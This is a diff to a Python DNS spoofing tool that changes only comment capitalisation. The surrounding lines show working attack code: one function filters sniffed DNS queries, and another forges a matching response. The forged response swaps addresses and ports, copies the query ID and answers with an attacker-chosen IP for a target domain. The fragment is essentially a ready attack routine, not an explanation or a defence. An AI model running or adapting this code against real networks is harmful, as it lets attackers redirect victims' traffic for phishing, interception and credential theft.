@@ -66,11 +66,11 @@ def analyze_packet(packet, table):
     Analyzes dns packets sniffed by attack
     '''
 
-    # check for proper DNS reqs only
+    # Check for proper DNS reqs only
     if not packet.haslayer(DNS) or not packet.haslayer(IP):
         return
 
-    # filter out answers
+    # Filter out answers
     if packet[DNS].qr != 0:
         return
 
@@ -90,23 +90,23 @@ def spoof_packet(packet, spoofed_domain, spoofed_ip):
     # Make DNS template message
     spoofed_reply = IP() / UDP() / DNS()
 
-    # swap source/dest for UDP and IP layers
+    # Swap source/dest for UDP and IP layers
     spoofed_reply[IP].src = packet[IP].dst
     spoofed_reply[IP].dst = packet[IP].src
     spoofed_reply[UDP].sport = packet[UDP].dport
     spoofed_reply[UDP].dport = packet[UDP].sport
 
-    # copy the ID
+    # Copy the ID
     spoofed_reply[DNS].id = packet[DNS].id
 
-    # set query to response
+    # Set query to response
     spoofed_reply[DNS].qr = 1
     spoofed_reply[DNS].aa = 0
 
-    # pass the DNS Question Record to the resposne
+    # Pass the DNS Question Record to the resposne
     spoofed_reply[DNS].qd = packet[DNS].qd
 
-    # set spoofed answer
+    # Set spoofed answer
     spoofed_reply[DNS].an = DNSRR(rrname=spoofed_domain+'.', rdata=spoofed_ip, type="A", rclass="IN")
 
     click.echo("Sending spoofed packet")
